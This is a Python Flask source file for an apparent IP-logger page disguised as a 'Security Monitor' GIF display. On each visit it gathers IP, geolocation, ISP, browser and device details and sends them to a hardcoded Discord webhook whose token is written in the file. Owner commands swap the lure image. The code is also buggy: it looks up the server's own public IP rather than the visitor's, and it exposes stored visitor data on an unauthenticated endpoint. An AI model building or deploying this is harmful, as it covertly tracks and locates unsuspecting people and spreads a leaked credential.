from flask import Flask, request, render_template_string, jsonify
import requests
import json
import os
from datetime import datetime
import re
import time

app = Flask(__name__)

# Configuration - Using Environment Variables
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1527150420537905292/kayD-ghBN6shDNhFJNPOuncX9myoTGpqAMnMMEZqGSoMchA47oTvViwJiBbBQUpJBxjQ")
OWNER_ID = os.environ.get('OWNER_ID', "1477672979272831089")

# Default GIF URL
DEFAULT_MEDIA_URL = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNW8xa2p0bjZzenluNDlqN3dmaDd0MTcwcWwyeGoydWpoNjQyZWY3ZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l0IyeheChYxx2byDu/giphy.gif"

# Store current media URL
current_media_url = DEFAULT_MEDIA_URL
media_type = "gif"

# Store visitor logs (in-memory, will reset on restart)
visitor_logs = []
MAX_LOGS = 100

# HTML Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Monitor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1a3e 50%, #0a0e27 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }
        
        .media-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .media-container img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid rgba(0, 255, 0, 0.1);
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        
        .status-text {
            color: #00ff00;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 1px;
        }
        
        .media-info {
            color: rgba(255, 255, 255, 0.5);
            font-size: 12px;
            font-family: monospace;
        }
        
        .glow-effect {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0, 255, 0, 0.03) 0%, transparent 70%);
            pointer-events: none;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            
            .status-bar {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="media-container">
            <div class="glow-effect"></div>
            <img src="{{ media_url }}" alt="Security Monitor">
        </div>
        
        <div class="status-bar">
            <div class="status-indicator">
                <div class="status-dot"></div>
                <span class="status-text">Security Monitoring Active</span>
            </div>
            <div class="media-info">
                {{ media_type|upper }} • {{ media_url[:30] }}...
            </div>
        </div>
    </div>
</body>
</html>
"""

def get_public_ip():
    """Get visitor's public IP address"""
    try:
        # Try multiple services for redundancy
        services = [
            'https://api.ipify.org?format=json',
            'https://api.my-ip.io/ip.json',
            'https://ipapi.co/json/'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if 'ip' in data:
                        return data['ip']
                    elif 'ip_address' in data:
                        return data['ip_address']
            except:
                continue
        
        return "Unable to retrieve"
    except:
        return "Unable to retrieve"

def get_accurate_geo_location(ip):
    """Get accurate geolocation data using multiple services"""
    
    # Try ip-api.com first (most accurate for India/Asia)
    try:
        response = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query',
            timeout=5
        )
        data = response.json()
        if data.get('status') == 'success':
            return {
                'ip': data.get('query', ip),
                'country': data.get('country', 'N/A'),
                'country_code': data.get('countryCode', 'N/A'),
                'region': data.get('regionName', 'N/A'),
                'city': data.get('city', 'N/A'),
                'postal': data.get('zip', 'N/A'),
                'latitude': data.get('lat', 'N/A'),
                'longitude': data.get('lon', 'N/A'),
                'timezone': data.get('timezone', 'N/A'),
                'isp': data.get('isp', 'N/A'),
                'org': data.get('org', 'N/A'),
                'asn': data.get('as', 'N/A'),
                'as_name': data.get('asname', 'N/A'),
                'source': 'ip-api.com'
            }
    except:
        pass
    
    # Try ipapi.co as backup
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'error' not in data:
                return {
                    'ip': data.get('ip', ip),
                    'country': data.get('country_name', 'N/A'),
                    'country_code': data.get('country_code', 'N/A'),
                    'region': data.get('region', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'postal': data.get('postal', 'N/A'),
                    'latitude': data.get('latitude', 'N/A'),
                    'longitude': data.get('longitude', 'N/A'),
                    'timezone': data.get('timezone', 'N/A'),
                    'isp': data.get('org', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'asn': data.get('asn', 'N/A'),
                    'as_name': data.get('asn_name', 'N/A'),
                    'source': 'ipapi.co'
                }
    except:
        pass
    
    # Try freegeoip as last resort
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'error' not in data:
                return {
                    'ip': data.get('ip', ip),
                    'country': data.get('country_name', 'N/A'),
                    'country_code': data.get('country_code', 'N/A'),
                    'region': data.get('region', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'postal': data.get('postal', 'N/A'),
                    'latitude': data.get('latitude', 'N/A'),
                    'longitude': data.get('longitude', 'N/A'),
                    'timezone': data.get('timezone', 'N/A'),
                    'isp': data.get('org', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'asn': data.get('asn', 'N/A'),
                    'as_name': data.get('asn_name', 'N/A'),
                    'source': 'ipapi.co'
                }
    except:
        pass
    
    # Fallback with basic info
    return {
        'ip': ip,
        'country': 'Unknown',
        'country_code': 'N/A',
        'region': 'Unknown',
        'city': 'Unknown',
        'postal': 'N/A',
        'latitude': 'N/A',
        'longitude': 'N/A',
        'timezone': 'UTC',
        'isp': 'Unknown',
        'org': 'Unknown',
        'asn': 'N/A',
        'as_name': 'N/A',
        'source': 'fallback'
    }

def get_browser_info(user_agent):
    """Extract browser and system information"""
    browser_info = {
        'browser': 'Unknown',
        'browser_version': 'Unknown',
        'os': 'Unknown',
        'os_version': 'Unknown',
        'device': 'Unknown',
        'is_mobile': False
    }
    
    if user_agent:
        # Browser detection with version
        if 'Chrome' in user_agent and 'Edg' not in user_agent:
            browser_info['browser'] = 'Chrome'
            match = re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'Firefox' in user_agent:
            browser_info['browser'] = 'Firefox'
            match = re.search(r'Firefox/(\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
            browser_info['browser'] = 'Safari'
            match = re.search(r'Version/(\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'Edg' in user_agent:
            browser_info['browser'] = 'Edge'
            match = re.search(r'Edg/(\d+\.\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'Opera' in user_agent or 'OPR' in user_agent:
            browser_info['browser'] = 'Opera'
            match = re.search(r'OPR/(\d+\.\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        
        # OS detection with version
        if 'Windows NT 10.0' in user_agent:
            browser_info['os'] = 'Windows 10/11'
        elif 'Windows NT 6.3' in user_agent:
            browser_info['os'] = 'Windows 8.1'
        elif 'Windows NT 6.2' in user_agent:
            browser_info['os'] = 'Windows 8'
        elif 'Windows NT 6.1' in user_agent:
            browser_info['os'] = 'Windows 7'
        elif 'Mac OS X' in user_agent:
            browser_info['os'] = 'macOS'
            match = re.search(r'Mac OS X (\d+_\d+_\d+)', user_agent)
            if match:
                browser_info['os_version'] = match.group(1).replace('_', '.')
        elif 'Linux' in user_agent and 'Android' not in user_agent:
            browser_info['os'] = 'Linux'
        elif 'Android' in user_agent:
            browser_info['os'] = 'Android'
            browser_info['is_mobile'] = True
            match = re.search(r'Android (\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['os_version'] = match.group(1)
        elif 'iPhone' in user_agent or 'iPad' in user_agent:
            browser_info['os'] = 'iOS'
            browser_info['is_mobile'] = True
        
        # Device detection
        if 'iPhone' in user_agent:
            browser_info['device'] = 'iPhone'
        elif 'iPad' in user_agent:
            browser_info['device'] = 'iPad'
        elif 'Android' in user_agent and 'Mobile' in user_agent:
            browser_info['device'] = 'Android Phone'
        elif 'Android' in user_agent:
            browser_info['device'] = 'Android Tablet'
        elif 'Windows' in user_agent:
            browser_info['device'] = 'Windows PC'
        elif 'Mac' in user_agent:
            browser_info['device'] = 'Mac'
        elif 'Linux' in user_agent:
            browser_info['device'] = 'Linux PC'
    
    return browser_info

def send_discord_embed(visitor_data):
    """Send detailed embed to Discord"""
    
    # Create location string
    location_parts = []
    if visitor_data.get('city') and visitor_data['city'] != 'N/A':
        location_parts.append(visitor_data['city'])
    if visitor_data.get('region') and visitor_data['region'] != 'N/A':
        location_parts.append(visitor_data['region'])
    if visitor_data.get('country') and visitor_data['country'] != 'N/A':
        location_parts.append(visitor_data['country'])
    
    location = ', '.join(location_parts) if location_parts else 'Unknown'
    
    # Create ISP string
    isp_parts = []
    if visitor_data.get('isp') and visitor_data['isp'] != 'N/A' and visitor_data['isp'] != 'Unknown':
        isp_parts.append(visitor_data['isp'])
    if visitor_data.get('as_name') and visitor_data['as_name'] != 'N/A':
        isp_parts.append(f"(AS{visitor_data.get('asn', 'N/A')})")
    
    isp_info = ' '.join(isp_parts) if isp_parts else 'Unknown'
    
    embed = {
        "title": "Security Alert - Visitor Detected",
        "color": 0x00ff00,
        "timestamp": datetime.utcnow().isoformat(),
        "fields": [
            {
                "name": "IP Address",
                "value": f"`{visitor_data.get('ip', 'N/A')}`",
                "inline": True
            },
            {
                "name": "Location",
                "value": location,
                "inline": True
            },
            {
                "name": "Coordinates",
                "value": f"Lat: {visitor_data.get('latitude', 'N/A')}\nLon: {visitor_data.get('longitude', 'N/A')}",
                "inline": True
            },
            {
                "name": "Timezone",
                "value": visitor_data.get('timezone', 'N/A'),
                "inline": True
            },
            {
                "name": "ISP/Organization",
                "value": isp_info,
                "inline": True
            },
            {
                "name": "Postal Code",
                "value": visitor_data.get('postal', 'N/A'),
                "inline": True
            },
            {
                "name": "Browser",
                "value": f"{visitor_data.get('browser', 'Unknown')} {visitor_data.get('browser_version', '')}".strip(),
                "inline": True
            },
            {
                "name": "Operating System",
                "value": f"{visitor_data.get('os', 'Unknown')} {visitor_data.get('os_version', '')}".strip(),
                "inline": True
            },
            {
                "name": "Device",
                "value": visitor_data.get('device', 'Unknown'),
                "inline": True
            },
            {
                "name": "User Agent",
                "value": visitor_data.get('user_agent', 'N/A')[:200] + ("..." if len(visitor_data.get('user_agent', '')) > 200 else ""),
                "inline": False
            },
            {
                "name": "Visit Time",
                "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
                "inline": True
            },
            {
                "name": "Data Source",
                "value": visitor_data.get('geo_source', 'N/A'),
                "inline": True
            }
        ],
        "footer": {
            "text": "Security Monitoring System | Data collected for defensive purposes only"
        }
    }
    
    data = {
        "embeds": [embed],
        "content": "New Visitor Detected - Security Log"
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return response.status_code == 204
    except:
        return False

@app.route('/')
def index():
    global current_media_url, media_type
    
    # Get visitor information
    visitor_ip = request.remote_addr
    
    # If behind proxy, get real IP
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    # Get public IP
    public_ip = get_public_ip()
    
    # Get accurate geolocation
    geo_data = get_accurate_geo_location(public_ip)
    
    # Get browser info
    user_agent = request.headers.get('User-Agent', '')
    browser_info = get_browser_info(user_agent)
    
    # Prepare visitor data
    visitor_data = {
        'ip': public_ip,
        'country': geo_data.get('country', 'N/A'),
        'country_code': geo_data.get('country_code', 'N/A'),
        'region': geo_data.get('region', 'N/A'),
        'city': geo_data.get('city', 'N/A'),
        'postal': geo_data.get('postal', 'N/A'),
        'latitude': geo_data.get('latitude', 'N/A'),
        'longitude': geo_data.get('longitude', 'N/A'),
        'timezone': geo_data.get('timezone', 'N/A'),
        'isp': geo_data.get('isp', 'N/A'),
        'org': geo_data.get('org', 'N/A'),
        'asn': geo_data.get('asn', 'N/A'),
        'as_name': geo_data.get('as_name', 'N/A'),
        'geo_source': geo_data.get('source', 'N/A'),
        'browser': browser_info['browser'],
        'browser_version': browser_info['browser_version'],
        'os': browser_info['os'],
        'os_version': browser_info['os_version'],
        'device': browser_info['device'],
        'is_mobile': browser_info['is_mobile'],
        'user_agent': user_agent,
        'visit_time': datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    }
    
    # Store log
    visitor_logs.append(visitor_data)
    if len(visitor_logs) > MAX_LOGS:
        visitor_logs.pop(0)
    
    # Send to Discord
    send_discord_embed(visitor_data)
    
    # Return the HTML page
    return render_template_string(
        HTML_TEMPLATE,
        media_url=current_media_url,
        media_type=media_type
    )

@app.route('/command', methods=['POST'])
def handle_command():
    """Handle Discord commands from owner"""
    global current_media_url, media_type
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid request"}), 400
        
        user_id = data.get('user_id')
        if user_id != OWNER_ID:
            send_discord_command_response("Unauthorized: You are not the owner", False)
            return jsonify({"error": "Unauthorized"}), 403
        
        command = data.get('command', '').strip()
        
        if command.startswith('/gif '):
            new_url = command[5:].strip()
            if is_valid_url(new_url):
                current_media_url = new_url
                media_type = "gif"
                send_discord_command_response(f"GIF updated successfully!\nNew URL: {new_url}", True)
                return jsonify({"success": True, "media_url": new_url, "type": "gif"}), 200
            else:
                send_discord_command_response("Invalid URL provided", False)
                return jsonify({"error": "Invalid URL"}), 400
                
        elif command.startswith('/img '):
            new_url = command[5:].strip()
            if is_valid_url(new_url):
                current_media_url = new_url
                media_type = "img"
                send_discord_command_response(f"Image updated successfully!\nNew URL: {new_url}", True)
                return jsonify({"success": True, "media_url": new_url, "type": "img"}), 200
            else:
                send_discord_command_response("Invalid URL provided", False)
                return jsonify({"error": "Invalid URL"}), 400
        
        elif command == '/reset':
            current_media_url = DEFAULT_MEDIA_URL
            media_type = "gif"
            send_discord_command_response("Media reset to default GIF", True)
            return jsonify({"success": True, "media_url": DEFAULT_MEDIA_URL, "type": "gif"}), 200
        
        elif command == '/status':
            send_discord_command_response(f"Current media: {media_type}\nURL: {current_media_url}", True)
            return jsonify({"success": True, "media_url": current_media_url, "type": media_type}), 200
        
        elif command == '/logs':
            # Return last 5 logs (for debugging)
            log_summary = []
            for log in visitor_logs[-5:]:
                log_summary.append({
                    'ip': log.get('ip', 'N/A'),
                    'location': f"{log.get('city', 'N/A')}, {log.get('country', 'N/A')}",
                    'time': log.get('visit_time', 'N/A')
                })
            return jsonify({"logs": log_summary}), 200
        
        else:
            send_discord_command_response("Unknown command. Available: /gif <url>, /img <url>, /reset, /status, /logs", False)
            return jsonify({"error": "Unknown command"}), 400
            
    except Exception as e:
        send_discord_command_response(f"Error: {str(e)}", False)
        return jsonify({"error": str(e)}), 500

def send_discord_command_response(message, success=True):
    """Send command response to Discord"""
    embed = {
        "title": "Command Executed" if success else "Command Failed",
        "color": 0x00ff00 if success else 0xff0000,
        "description": message,
        "timestamp": datetime.utcnow().isoformat()
    }
    
    data = {
        "embeds": [embed],
        "content": "Command Response"
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return response.status_code == 204
    except:
        return False

def is_valid_url(url):
    """Validate URL format"""
    url_pattern = re.compile(
        r'^https?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(url_pattern, url) is not None

@app.route('/api/status')
def get_status():
    """Get current media status"""
    return jsonify({
        "media_url": current_media_url,
        "media_type": media_type,
        "default_url": DEFAULT_MEDIA_URL,
        "total_visitors": len(visitor_logs)
    })

@app.route('/api/last_visitor')
def get_last_visitor():
    """Get last visitor data (for debugging)"""
    if visitor_logs:
        return jsonify(visitor_logs[-1])
    return jsonify({"message": "No visitors yet"})

# For local testing
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
